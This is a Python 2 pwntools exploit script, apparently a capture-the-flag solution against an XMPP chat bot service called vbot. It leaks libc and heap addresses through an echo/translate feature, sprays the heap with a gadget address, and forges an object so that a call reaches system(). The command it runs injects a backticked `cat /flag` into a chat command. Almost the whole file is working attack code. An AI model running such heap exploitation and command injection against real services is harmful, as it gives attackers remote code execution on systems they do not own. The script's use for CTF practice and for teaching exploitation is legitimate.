#!/usr/bin/env python2

from pwn import *
from vbot import VBot, VBotBase

def main():
    host = sys.argv[1]
    port = int(sys.argv[2])

    class GoodNameBot(VBotBase):
        def __init__(self, *args, **kwargs):
            VBotBase.__init__(self, *args, **kwargs)
            self.connect()
            self.process(block=False)

        def session_bind(self, e):
            log.info('bound to %s', self.boundjid.bare)
            if len(self.boundjid.bare) % 2 == 0:
                log.info('request another user')
                self.disconnect()
                self.connect()

    A = GoodNameBot()

    class MyVBot(VBot):
        def target_ready(self, e):
            VBot.target_ready(self, e)

            A.state.ensure('connected')
            bare = A.boundjid.bare
            cmd = '/vbot $VCHAT_SERVER %s `cat /flag`;' % self.boundjid.username
            # cmd = '/vbot $VCHAT_SERVER %s `cat /flag`;' % 'admin' # test!
            prefix = 'O' * 0x20 + bare + cmd
            # leak
            d = self.try_leak(0x800, prefix=prefix)
            if d[0x20:0x20 + len(bare)] != bare:
                self.check_fail('failed to shape heap')

            libc_ptr = u64(d[:8])
            heap_ptr = u64(d[0x10:0x18])
            log.info('libc ptr = %#x', libc_ptr)
            log.info('heap ptr = %#x', heap_ptr)
            jid_addr = heap_ptr + 0x30
            cmd_addr = jid_addr + len(bare)

            libc_base = libc_ptr - 0x3ec200
            # mov 0xa8(%rdi),%rcx; push %rcx; mov 0x68(%rdi),%rdi ret;
            my_magic = libc_base + 0x520c7
            system = libc_base + 0x4f440

            # spray
            # block = 'A' * 0x800
            block = p64(my_magic) * 0x100
            for _ in xrange(32):
                self.translate('2', block.encode('base64').replace('\n',
                    ''), 'b64', block=False)

            obj_addr = heap_ptr + 0x18000
            log.info('check %#x is filled', obj_addr)

            # raw_input('attach')
            A.make_message(self.target, 'ping', mtype='chat').send()
            A.make_message(self.target, 'bye', mtype='normal').send()

            # block = [random.randint(0, 2 ** 64 - 1)] * (0x120 / 8)
            block = [0] * (0x120 / 8)
            block[0] = obj_addr
            block[0x68 / 8] = cmd_addr
            block[0x90 / 8] = jid_addr
            block[0x98 / 8] = len(bare)
            block[0xa8 / 8] = system
            payload = ''.join(map(p64, block))
            for _ in xrange(8):
                self.translate('x', payload.encode('base64').replace('\n',
                    ''), 'b64', block=True)

            log.info('trigger')
            self.schedule('final count down', 2, self.check_fail,
                    args=('exploit fail',))
            A.message_sync(A.make_message(self.target, 'ping',
                mtype='chat'))
            A.set_stop()
            A.disconnect()

        def try_leak(self, n, prefix=''):
            ret = self.translate('echo', prefix.ljust(n * 2, 'O'), 'hex')
            return ret

        def message(self, msg):
            body = msg.get('body')
            if body != 'hello':
                log.info('FLAG: %s', body)
                print 'FLAG:', body
                self.check_done()

    B = MyVBot((host, port))
    B.connect()
    B.process(block=True)

    sys.exit(0)


if __name__ == '__main__':
    # logging.basicConfig(level=logging.DEBUG, format='%(levelname)-8s %(message)s')
    main()
